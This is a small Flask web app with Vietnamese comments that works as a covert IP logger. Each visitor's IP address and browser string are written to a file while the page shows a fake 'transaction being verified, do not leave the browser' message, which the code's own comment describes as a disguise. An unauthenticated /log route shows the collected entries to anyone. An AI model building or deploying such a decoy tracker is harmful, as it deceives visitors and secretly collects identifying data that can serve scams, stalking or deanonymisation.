from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    # Lấy IP từ header đúng cách
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # Lấy thông tin User-Agent
    ua = request.headers.get('User-Agent')

    # Thời gian hiện tại
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Ghi log vào file
    log = f"{now} - IP: {ip} - Agent: {ua}\n"
    with open("ip_log.txt", "a", encoding='utf-8') as f:
        f.write(log)

    # Trả về nội dung giả dạng một giao dịch đang xử lý
    return '''
    <html>
      <head><title>Đang xử lý giao dịch</title></head>
      <body style="font-family:sans-serif;text-align:center;margin-top:100px;">
        <h2>Giao dịch đang được xác minh, vui lòng không thoát trình duyệt...</h2>
      </body>
    </html>
    '''

@app.route('/log')
def view_log():
    try:
        with open("ip_log.txt", "r", encoding='utf-8') as f:
            return f"<pre>{f.read()}</pre>"
    except FileNotFoundError:
        return "Chưa có dữ liệu truy cập nào được ghi lại."
